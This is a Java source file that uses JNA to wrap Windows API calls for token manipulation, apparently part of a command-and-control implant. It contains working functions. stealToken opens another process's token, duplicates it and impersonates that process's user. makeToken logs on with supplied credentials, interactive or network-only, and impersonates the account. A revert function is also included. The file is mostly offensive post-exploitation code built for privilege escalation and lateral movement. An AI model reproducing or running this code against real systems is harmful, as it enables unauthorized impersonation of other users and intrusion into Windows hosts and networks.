package com.woopsie.utils;

import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.platform.win32.*;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

/**
 * Windows API wrappers for token manipulation
 */
public class WindowsAPI {
    
    // Token access rights
    public static final int TOKEN_QUERY = 0x0008;
    public static final int TOKEN_DUPLICATE = 0x0002;
    public static final int TOKEN_ASSIGN_PRIMARY = 0x0001;
    public static final int TOKEN_IMPERSONATE = 0x0004;
    public static final int TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public static final int TOKEN_ADJUST_GROUPS = 0x0040;
    public static final int TOKEN_ADJUST_DEFAULT = 0x0080;
    public static final int MAXIMUM_ALLOWED = 0x02000000;
    
    // Process access rights
    public static final int PROCESS_QUERY_INFORMATION = 0x0400;
    public static final int PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    
    // Security impersonation levels
    public static final int SecurityImpersonation = 2;
    
    // Token types
    public static final int TokenPrimary = 1;
    public static final int TokenImpersonation = 2;
    
    // Logon types
    public static final int LOGON32_LOGON_INTERACTIVE = 2;
    public static final int LOGON32_LOGON_NETWORK = 3;
    public static final int LOGON32_LOGON_BATCH = 4;
    public static final int LOGON32_LOGON_SERVICE = 5;
    public static final int LOGON32_LOGON_UNLOCK = 7;
    public static final int LOGON32_LOGON_NETWORK_CLEARTEXT = 8;
    public static final int LOGON32_LOGON_NEW_CREDENTIALS = 9;
    
    // Logon providers
    public static final int LOGON32_PROVIDER_DEFAULT = 0;
    public static final int LOGON32_PROVIDER_WINNT50 = 3;
    
    /**
     * Extended Advapi32 interface with token manipulation functions
     */
    public interface Advapi32Ext extends StdCallLibrary {
        Advapi32Ext INSTANCE = loadAdvapi32();
        
        boolean OpenProcessToken(
            WinNT.HANDLE processHandle,
            int desiredAccess,
            WinNT.HANDLEByReference tokenHandle
        );
        
        boolean DuplicateTokenEx(
            WinNT.HANDLE existingToken,
            int desiredAccess,
            WinBase.SECURITY_ATTRIBUTES securityAttributes,
            int impersonationLevel,
            int tokenType,
            WinNT.HANDLEByReference newToken
        );
        
        boolean SetThreadToken(
            WinNT.HANDLEByReference thread,
            WinNT.HANDLE token
        );
        
        boolean RevertToSelf();
        
        boolean ImpersonateLoggedOnUser(WinNT.HANDLE token);
        
        boolean LogonUserW(
            char[] username,
            char[] domain,
            char[] password,
            int logonType,
            int logonProvider,
            WinNT.HANDLEByReference token
        );
    }
    
    /**
     * Extended Kernel32 interface
     */
    public interface Kernel32Ext extends StdCallLibrary {
        Kernel32Ext INSTANCE = loadKernel32();
        
        WinNT.HANDLE OpenProcess(
            int dwDesiredAccess,
            boolean bInheritHandle,
            int dwProcessId
        );
        
        boolean CloseHandle(WinNT.HANDLE handle);
        
        WinNT.HANDLE GetCurrentThread();
        
        int GetLastError();
    }
    
    /**
     * Steal a token from a process
     * @param pid Process ID to steal token from
     * @return Success message or null on failure
     * @throws Exception if token stealing fails
     */
    public static String stealToken(int pid) throws Exception {
        if (!isWindows()) {
            throw new Exception("Token stealing is only supported on Windows");
        }
        
        if (Kernel32Ext.INSTANCE == null || Advapi32Ext.INSTANCE == null) {
            throw new Exception("Windows API libraries not available");
        }
        
        WinNT.HANDLE processHandle = null;
        WinNT.HANDLEByReference processTokenRef = new WinNT.HANDLEByReference();
        WinNT.HANDLEByReference impersonationTokenRef = new WinNT.HANDLEByReference();
        
        try {
            // Open the target process
            processHandle = Kernel32Ext.INSTANCE.OpenProcess(
                PROCESS_QUERY_INFORMATION,
                false,
                pid
            );
            
            if (processHandle == null || WinBase.INVALID_HANDLE_VALUE.equals(processHandle)) {
                throw new Exception("Failed to open process " + pid + ". Error: " + Kernel32Ext.INSTANCE.GetLastError());
            }
            
            // Open the process token
            if (!Advapi32Ext.INSTANCE.OpenProcessToken(
                    processHandle,
                    TOKEN_DUPLICATE | TOKEN_QUERY,
                    processTokenRef)) {
                throw new Exception("Failed to open process token. Error: " + Kernel32Ext.INSTANCE.GetLastError());
            }
            
            WinNT.HANDLE processToken = processTokenRef.getValue();
            
            // Duplicate the token as an impersonation token
            if (!Advapi32Ext.INSTANCE.DuplicateTokenEx(
                    processToken,
                    MAXIMUM_ALLOWED,
                    null,
                    SecurityImpersonation,
                    TokenImpersonation,
                    impersonationTokenRef)) {
                Kernel32Ext.INSTANCE.CloseHandle(processToken);
                throw new Exception("Failed to duplicate token. Error: " + Kernel32Ext.INSTANCE.GetLastError());
            }
            
            WinNT.HANDLE impersonationToken = impersonationTokenRef.getValue();
            
            // Revert to self before setting new token
            Advapi32Ext.INSTANCE.RevertToSelf();
            
            // Set the thread token to impersonate
            if (!Advapi32Ext.INSTANCE.SetThreadToken(null, impersonationToken)) {
                Kernel32Ext.INSTANCE.CloseHandle(processToken);
                Kernel32Ext.INSTANCE.CloseHandle(impersonationToken);
                throw new Exception("Failed to set thread token. Error: " + Kernel32Ext.INSTANCE.GetLastError());
            }
            
            // Clean up process token (keep impersonation token active)
            Kernel32Ext.INSTANCE.CloseHandle(processToken);
            
            // Get the new user context
            String newUser = SystemInfo.getUsername();
            String domain = SystemInfo.getDomain();
            
            return String.format("Successfully impersonated %s\\%s from PID %d", domain, newUser, pid);
            
        } finally {
            // Clean up process handle
            if (processHandle != null && !WinBase.INVALID_HANDLE_VALUE.equals(processHandle)) {
                Kernel32Ext.INSTANCE.CloseHandle(processHandle);
            }
        }
    }
    
    /**
     * Create a new logon session and impersonate the user
     * @param username Username
     * @param password Password
     * @param domain Domain (use "." for local)
     * @param netOnly If true, uses LOGON32_LOGON_NEW_CREDENTIALS (network only), otherwise LOGON32_LOGON_INTERACTIVE
     * @return Success message
     * @throws Exception if token creation fails
     */
    public static String makeToken(String username, String password, String domain, boolean netOnly) throws Exception {
        if (!isWindows()) {
            throw new Exception("Token creation is only supported on Windows");
        }
        
        if (Advapi32Ext.INSTANCE == null) {
            throw new Exception("Windows API libraries not available");
        }
        
        // Convert strings to wide char arrays (UTF-16)
        char[] usernameW = (username + "\0").toCharArray();
        char[] passwordW = (password + "\0").toCharArray();
        char[] domainW = (domain + "\0").toCharArray();
        
        WinNT.HANDLEByReference tokenRef = new WinNT.HANDLEByReference();
        
        int logonType = netOnly ? LOGON32_LOGON_NEW_CREDENTIALS : LOGON32_LOGON_INTERACTIVE;
        int logonProvider = netOnly ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT;
        
        // Log on user
        if (!Advapi32Ext.INSTANCE.LogonUserW(
                usernameW,
                domainW,
                passwordW,
                logonType,
                logonProvider,
                tokenRef)) {
            throw new Exception("Failed to log on user. Error: " + Kernel32Ext.INSTANCE.GetLastError());
        }
        
        WinNT.HANDLE token = tokenRef.getValue();
        
        try {
            // Revert any existing impersonation before applying the new one
            if (!Advapi32Ext.INSTANCE.RevertToSelf()) {
                int error = Kernel32Ext.INSTANCE.GetLastError();
                Kernel32Ext.INSTANCE.CloseHandle(token);
                throw new Exception("Failed to revert to self. Error: " + error);
            }
            
            // Impersonate the new user
            if (!Advapi32Ext.INSTANCE.ImpersonateLoggedOnUser(token)) {
                int error = Kernel32Ext.INSTANCE.GetLastError();
                Kernel32Ext.INSTANCE.CloseHandle(token);
                throw new Exception("Failed to impersonate user. Error: " + error);
            }
            
            // Token is now active, clean it up (the system keeps a reference)
            Kernel32Ext.INSTANCE.CloseHandle(token);
            
            // Get the new user context
            String newUser = SystemInfo.getUsername();
            String newDomain = SystemInfo.getDomain();
            
            String logonTypeStr = netOnly ? "NetOnly" : "Interactive";
            return String.format("Successfully impersonated %s\\%s (%s logon)", newDomain, newUser, logonTypeStr);
            
        } catch (Exception e) {
            // Clean up token on error
            Kernel32Ext.INSTANCE.CloseHandle(token);
            throw e;
        }
    }
    
    /**
     * Revert to original token
     * @return Success message
     */
    public static String revertToSelf() {
        if (!isWindows() || Advapi32Ext.INSTANCE == null) {
            return "Token reversion is only supported on Windows";
        }
        
        if (Advapi32Ext.INSTANCE.RevertToSelf()) {
            String username = SystemInfo.getUsername();
            return "Successfully reverted to original token: " + username;
        } else {
            return "Failed to revert to self. Error: " + Kernel32Ext.INSTANCE.GetLastError();
        }
    }
    
    /**
     * Check if we're running on Windows
     */
    public static boolean isWindows() {
        String os = System.getProperty("os.name", "").toLowerCase();
        return os.contains("win");
    }
    
    /**
     * Lazy load Advapi32 library - only on Windows
     */
    private static Advapi32Ext loadAdvapi32() {
        if (!isWindows()) {
            return null;
        }
        try {
            return Native.load("Advapi32", Advapi32Ext.class, W32APIOptions.DEFAULT_OPTIONS);
        } catch (UnsatisfiedLinkError e) {
            // Library not available (non-Windows or missing DLL)
            return null;
        }
    }
    
    /**
     * Lazy load Kernel32 library - only on Windows
     */
    private static Kernel32Ext loadKernel32() {
        if (!isWindows()) {
            return null;
        }
        try {
            return Native.load("kernel32", Kernel32Ext.class, W32APIOptions.DEFAULT_OPTIONS);
        } catch (UnsatisfiedLinkError e) {
            // Library not available (non-Windows or missing DLL)
            return null;
        }
    }
}
